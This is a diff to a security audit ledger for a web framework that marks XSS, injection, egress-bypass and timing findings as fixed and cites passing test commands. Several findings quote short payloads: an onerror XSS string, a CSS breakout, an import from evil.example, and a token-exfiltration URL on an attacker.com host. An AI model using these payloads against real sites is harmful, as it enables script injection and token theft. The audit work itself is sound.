@@ -73,19 +73,24 @@ M9–M13 cluster in the rate-limit/capability runtime surface.
   - **Distinct:** bugz-3 M3 was exact-line-vs-substring; this is the residual raw-HTML-vs-`textContent` (tag-stripping) axis its fix didn't model.
   - **Fix:** model the client's check — strip tags / scan concatenated text (or escape the marker out of attacker-reachable text), and include the shell, before deciding to re-roll.
 
-- [ ] **M3 — KV426 `trustedHtml` provenance gate misses object destructuring and ternary taint paths (stored/reflected XSS via the escape hatch).** `packages/compiler/src/validate/trusted-html-provenance.ts:132-145,187-221`
+- [x] **M3 — KV426 `trustedHtml` provenance gate misses object destructuring and ternary taint paths (stored/reflected XSS via the escape hatch).** `packages/compiler/src/validate/trusted-html-provenance.ts:132-145,187-221`
   - `classifyExpression` handles only PropertyAccess/ElementAccess/Identifier; a `ConditionalExpression` falls to `return null` (clean), and `classifyIdentifier`→`localConstInitializer` only follows aliases when `ts.isIdentifier(declaration.name)`, so an object-binding-pattern (`const { body } = post`) is invisible.
   - **Exploit:** `render: ({ post }) => { const { body } = post; return <article>{trustedHtml(body)}</article> }` (stored XSS from query data) and the request-input destructure form compile clean, while the dotted-alias equivalent is flagged. Gated on the author using `trustedHtml` on destructured tainted data.
   - **Verified:** worktree via `compileComponentModule` filtered to KV426: dotted control flagged; destructure + ternary forms → no KV426.
   - **Distinct:** static-analysis control-flow blind spot in the provenance gate, not bugz H6 (runtime brand forgery) or the JSX attribute-name XSS items.
   - **Fix:** resolve object/array binding patterns and nested render-param destructuring; classify both ternary arms.
+  - **Evidence:** `pnpm exec vitest run packages/compiler/src/trusted-html-provenance.test.ts --run`
+    passed after integration; the gate now flags object-destructured query/request aliases and tainted ternary arms.
 
-- [ ] **M4 — The `delta` boolean-attribute regex false-positives on an interior `delta` token in a query key, dropping/looping fresh query truth.** `packages/browser/src/wire-parser.ts:160-163` (+ inline loader `:740`)
+- [x] **M4 — The `delta` boolean-attribute regex false-positives on an interior `delta` token in a query key, dropping/looping fresh query truth.** `packages/browser/src/wire-parser.ts:160-163` (+ inline loader `:740`)
   - `hasBooleanAttribute(attrs,'delta')` scans the whole raw attrs string with `(?:^|\s)delta(?:\s|=|$|/|>)`, unaware of attribute-value quoting, so `key="river delta map"` sets `delta=true`.
   - **Exploit:** a keyed query whose instance key derives from user input (search-results keyed by the phrase) makes the client misread a full-value chunk as a `QueryDelta` → the value is applied as an empty delta (stale/unchanged), silently dropping fresh server truth.
   - **Verified:** worktree — `readQueryElementChunk({attrs:' name="search" key="river delta map"'}).delta === true` (control `key="river map"` → undefined).
   - **Distinct:** new wire-deserialization misclassification; unrelated to the deferred-stream framing items.
   - **Fix:** parse attributes structurally (or match `delta` only outside quoted values).
+  - **Evidence:** `pnpm exec vitest run packages/browser/src/wire-parser.test.ts
+packages/browser/src/inline-loader-enhanced-submit.test.ts --run` passed after integration, and
+    `pnpm --filter @kovojs/browser run check:inline-loader` proved generated inline-loader parity.
 
 - [ ] **M5 — bugz-3 M4 residual: a secret column raw-projected via a `with`-relation `extras` escapes the KV435 backstop when the related secret table isn't in `reads`.** `packages/drizzle/src/static/query-shapes.ts:159-200,461-477`
   - The M4 fix over-approximates RQB `extras` to opaque paths so KV435 can fire, but `secretProjectionBackstopDiagnostics` only treats a path as secret-leaking when the secret table is in `tableExpressions` (root only, per H2) or the author's declared `reads:`. A secret reached through a `with` relation is in neither unless manually listed.
@@ -165,12 +170,15 @@ packages/server/src/keyring.test.ts packages/server/src/env.test.ts --run` passe
   - **Distinct:** not the `_headers` sidecar items (bugz M4 / bugz-3 L8); this is the prune deleting a declared asset.
   - **Fix:** include static-asset (and client-module) writes in the owned set before pruning.
 
-- [ ] **M15 — `@kovojs/ui` Table structural parts (`Table`/`TableHead`/`TableBody`/`TableRow`) emit children RAW, bypassing the JSX runtime escaper (XSS).** `packages/ui/src/table.tsx:181,271`
+- [x] **M15 — `@kovojs/ui` Table structural parts (`Table`/`TableHead`/`TableBody`/`TableRow`) emit children RAW, bypassing the JSX runtime escaper (XSS).** `packages/ui/src/table.tsx:181,271`
   - `table.tsx` is the only `@kovojs/ui` component that hand-builds HTML and returns objects branded `Symbol.for('kovo.renderedHtml')` (trusted, shipped verbatim). `tablePart()` and `Table.render` interpolate `${children ?? ''}` with no escaping, and hand-built children never pass through the server JSX child escaper. Leaf cells (`TableCell`) correctly escape.
   - **Exploit:** dynamic non-reactive text placed directly under a structural part — `<Table><TableBody>{buildSummary(req.query.q)}</TableBody></Table>` — where the value is a bare local (so `shouldEscapeStaticTextExpression` is false → no compiler escapeText, and the runtime never escapes structural children) renders `<img src=x onerror=…>` live. Narrow (text must sit directly under a structural part, not a cell) but a real XSS.
   - **Verified:** worktree — `TableRow.render({children:'<img src=x onerror=alert(1)>'})` output contains the raw payload (no `&lt;`); `TableCell` escapes.
   - **Distinct:** no Table finding in prior ledgers; distinct from bugz-3 M7 (which _removed_ double-escaping in other primitives and is correct).
   - **Fix:** escape interpolated children in `tablePart`/`Table.render` (or route them through the runtime escaper); reserve the `renderedHtml` brand for genuinely framework-produced markup.
+  - **Evidence:** `pnpm exec vitest run packages/ui/src/table.stylex.test.tsx
+packages/ui/src/xss-escaping.test.tsx --run` passed after integration; structural parts escape
+    unbranded children while preserving branded table composition.
 
 ---
 
@@ -182,11 +190,13 @@ packages/server/src/keyring.test.ts packages/server/src/env.test.ts --run` passe
   - **Distinct:** bugz-3 M1 was a _silent_ (no-audit) bypass; here KV432 arms and a fact is produced, but the waiver is coarse and the fact inaccurate.
   - **Fix:** require `unsafe.downgrade` to enumerate (and match) each weakened attribute; reject a waiver that doesn't cover the actual downgrade.
 
-- [ ] **L2 — `SecretValue.equals`/`RedactedValue.equals` (advertised constant-time) leak operand length via variable loop count and silently return false for byte-equal non-string operands.** `packages/core/src/secret.ts:105-112,296-303`
+- [x] **L2 — `SecretValue.equals`/`RedactedValue.equals` (advertised constant-time) leak operand length via variable loop count and silently return false for byte-equal non-string operands.** `packages/core/src/secret.ts:105-112,296-303`
   - `timingSafeStringEqual` loops `Math.max(a.length,b.length)` iterations (equality is correct, but total time scales with the secret length); `KovoPoisonBox.equals` falls back to `Object.is` for non-strings, so byte-identical `Uint8Array`/`Buffer` tokens compare unequal by reference.
   - **Verified:** worktree — `equals` runtime scales with secret length; identical `Uint8Array` tokens → false.
   - **Distinct:** no prior item touches `secret.ts`; unrelated to bugz M3 (argon2 cost).
   - **Fix:** compare via a fixed-width digest (HMAC both sides then constant-time compare); handle byte-array operands.
+  - **Evidence:** `pnpm exec vitest run packages/core/src/secret.test.ts --run` passed after integration;
+    byte-like operands now compare by value through a fixed-width digest before equality.
 
 - [ ] **L3 — Guard-failure 403 forbidden HTML responses miss the entire §6.6 document security baseline and the per-principal cache floor.** `packages/server/src/guards.ts:552-556`, `packages/server/src/app-document.ts:114-120`
   - `renderHttpGuardFailureResponse` returns a bare `{body, headers:{Content-Type:text/html}, status:403}`; only 404/500 are routed through `renderErrorDocument`, and the status≠200 pass-through skips `stampPerPrincipalRouteOutcomeFloor`. So a 403 ships with no CSP / X-Frame-Options / COOP / Permissions-Policy / nosniff, and (for per-principal forbidden bodies) no no-store/Vary:Cookie.
@@ -213,19 +223,23 @@ packages/server/src/keyring.test.ts packages/server/src/env.test.ts --run` passe
   - **Distinct:** the explicit completeness residual of the bugz-3 H1/L11 alias-hardening.
   - **Fix:** resolve callee bindings by ts-morph symbol identity (follow const initializers + re-export chains) rather than syntactic forms.
 
-- [ ] **L7 — The module stream-text renderer import bypasses the dynamic-import URL allowlist enforced by every other dynamic-import sink.** `packages/browser/src/stream-text.ts:173-194`
+- [x] **L7 — The module stream-text renderer import bypasses the dynamic-import URL allowlist enforced by every other dynamic-import sink.** `packages/browser/src/stream-text.ts:173-194`
   - `StreamTextBuffer.render()` imports a `data-stream-renderer` ref via `this.importModule(parsed.url)` with no `assertAllowedKovoDynamicImportUrl` (handlers / query-bindings call it). Its only protection is a pre-wrapped `importModule`, which `installKovoLoader` provides only when `allowedClientModuleUrls` is set.
   - **Exploit:** an attacker-controlled `data-stream-renderer` attribute (surviving safeRichHtml's `data-*` passthrough) + the _module_ loader configured with a raw `import()` → cross-origin module import/exec. **Gated behind a non-default loader** (the default inline loader wraps `im` with the `ki` allowlist), so default-config apps are safe.
   - **Verified:** worktree — `new StreamTextBuffer({importModule:raw}).render()` imports `https://evil.example/x.js`; the sibling sinks' assert throws on it.
   - **Distinct:** bugz-2 M4 was the inline guard being too _permissive_; this is a missing explicit gate in the module stream-text path.
   - **Fix:** call `assertAllowedKovoDynamicImportUrl` in `StreamTextBuffer.render()` like the sibling sinks.
+  - **Evidence:** `pnpm exec vitest run packages/browser/src/mutation-response-apply.test.ts --run`
+    passed after integration; stream renderer imports now reject URLs outside the Kovo dynamic-import allowlist.
 
-- [ ] **L8 — The CI egress floor classifies any `127.`-prefixed _hostname_ as loopback, allowing exfil to attacker-owned `127.x.*` domains under deny-all.** `scripts/egress-floor-hook.cjs:27-36`
+- [x] **L8 — The CI egress floor classifies any `127.`-prefixed _hostname_ as loopback, allowing exfil to attacker-owned `127.x.*` domains under deny-all.** `scripts/egress-floor-hook.cjs:27-36`
   - `isLoopbackHost` does `normalized.startsWith('127.')` on the host _name_, not an in-`127.0.0.0/8` address check, so `127.0.0.1.attacker.com` (resolving to the attacker) is treated as loopback and allowed.
   - **Exploit:** a malicious build/publish dependency (the floor's threat model) connects/resolves to `http://127.0.0.1.attacker.com/?d=<token>` and exfiltrates under deny-all. Repo CI tooling, not shipped framework code.
   - **Verified:** worktree — `isLoopbackHost('127.0.0.1.attacker.com') === true`.
   - **Distinct:** bugz H2 is the runtime egress address[0]; bugz-3 L7 is this hook's DNS/UDP protocol coverage; this is the host-name prefix classification.
   - **Fix:** parse the host as an IP and check membership in `127.0.0.0/8` (and `::1`); never string-prefix the name.
+  - **Evidence:** `pnpm exec vitest run scripts/egress-floor.test.mjs --run` passed after integration;
+    `127.evil.example` is no longer treated as loopback.
 
 - [ ] **L9 — The `_headers` sidecar keys the per-document security floor at `/index.html` (never `/`) with no `/*` document catch-all, so pretty-URL/homepage requests can ship without the header floor.** `packages/server/src/static-export-output.ts:308-334`
   - The dynamic presets apply `documentStaticHeaders` to every document via a `/(.*)` catch-all; the sidecar instead emits one stanza per document keyed to its emitted file path (`/index.html`, `/about/index.html`) and no `/*` fallback. On hosts that match `_headers` against the _request_ path (Cloudflare Pages), a request to `/` or `/about/` matches no rule → no X-Frame-Options/COOP/Permissions-Policy/Referrer-Policy.
@@ -233,12 +247,14 @@ packages/server/src/keyring.test.ts packages/server/src/env.test.ts --run` passe
   - **Distinct:** bugz M4 = whether a sidecar is emitted; bugz-3 L8 = the immutable-asset stanzas; this is the document stanza _key_ and missing catch-all.
   - **Fix:** emit a `/*` document stanza carrying `documentStaticHeaders` (and/or key root document to `/`).
 
-- [ ] **L10 — bugz-3 L10 residual: the CSS-value guard doesn't cover `style.create`/`keyframes`, nor token/step NAMES — CSS rule injection escapes the guard.** `packages/style/src/engine.ts:629-640,700-726,524-540`
+- [x] **L10 — bugz-3 L10 residual: the CSS-value guard doesn't cover `style.create`/`keyframes`, nor token/step NAMES — CSS rule injection escapes the guard.** `packages/style/src/engine.ts:629-640,700-726,524-540`
   - `assertCssValueSafe` (rejects `<>{};\\`+controls) is wired into only `defineVars`/`createTheme` and only for the _value_. `style.create()`/`createAtomicStyles()` serialize values into identical `__rules[].rule` strings with no guard, and `keyframes()` serializes both the value and the step NAME, and `defineVars` doesn't guard the token NAME.
   - **Exploit:** `createAtomicStyles({a:{color:'red}html{background:url(//evil)'}})` injects a sibling rule; the same value can carry `</style>` if inlined. No default-config breach (these are build-time `@kovojs/style/internal` consumed with author-trusted literals).
   - **Verified:** worktree — `defineVars`/`createTheme` value THROWS (guard fires); `createAtomicStyles`/`createKeyframes`/token-name forms produce injection-bearing output.
   - **Distinct:** bugz-3 L10 fixed the `defineVars`/`createTheme` _value_; this covers the other functions + the NAME path.
   - **Fix:** route all rule-serializing functions (and token/step names) through `assertCssValueSafe`/an identifier validator.
+  - **Evidence:** `pnpm exec vitest run packages/style/src/engine.test.ts --run` passed after
+    integration; style.create, keyframes, and token/step names now fail closed on CSS breakout syntax.
 
 - [x] **L11 — The capability download route serves private bearer-token files with no `Cache-Control` header (the declared `cache:'private'` is enforced only in dev/CI and never emitted).** `packages/server/src/capability-route.ts:302-311,329`
   - `createStorageDownloadEndpoint` hand-builds a 200 with an ETag and no Cache-Control; the only consumer of `cache:'private'`, `assertEndpointResponsePosture`, is a dev/CI-only assertion that _throws_ on mismatch — it never injects the header. So in production a shared cache can heuristically store the token-keyed private download.
@@ -266,12 +282,14 @@ packages/server/src/keyring.test.ts packages/server/src/env.test.ts --run` passe
   - **Evidence:** `validateFrameworkSecret` now accepts `isSigningKeyRing(value)` before `{current}`/`{keys}`
     parsing; the integrated server capability/keyring/env Vitest command passed.
 
-- [ ] **L14 — Optimistic queue: a timed-out mutation that later settles applies stale server truth (and cross-tab broadcasts it) out of order, clobbering a later committed mutation.** `packages/browser/src/mutation-optimistic.ts:108-153`
+- [x] **L14 — Optimistic queue: a timed-out mutation that later settles applies stale server truth (and cross-tab broadcasts it) out of order, clobbering a later committed mutation.** `packages/browser/src/mutation-optimistic.ts:108-153`
   - On timeout, `MutationQueue` aborts the entry and drains to the next, but the task keeps awaiting its fetch; the CATCH branch guards on `queueState.timedOut` (proving the authors knew), while the SUCCESS and failed-response branches do **not** — a late success applies its (now stale) server truth and broadcasts it after a later mutation committed.
   - **Exploit:** a queued optimistic mutation A (count+1) then B (count+2) with a custom `enhancedMutations.fetch` wrapper that doesn't forward the abort signal (the docs invite a wrapper); A times out, B commits to count=2, then A's late success writes count=1 and broadcasts it. Gated on the queue + a non-abort-forwarding fetch wrapper.
   - **Verified:** worktree — real `submitOptimisticEnhancedMutation`+`MutationQueue(timeoutMs)`: a late success past timeout applies/broadcasts stale truth.
   - **Distinct:** not the keyed-optimism/lifecycle items (bugz-3, bugz-4 r1); this is the queue-timeout out-of-order apply.
   - **Fix:** guard the success and failed-response branches on `queueState.timedOut` too (drop a settled-after-timeout result), as the catch branch already does.
+  - **Evidence:** `pnpm exec vitest run packages/browser/src/mutation-optimistic-queue.test.ts --run`
+    passed after integration; a late timed-out head no longer applies stale server truth after the tail commits.
 
 ---
 
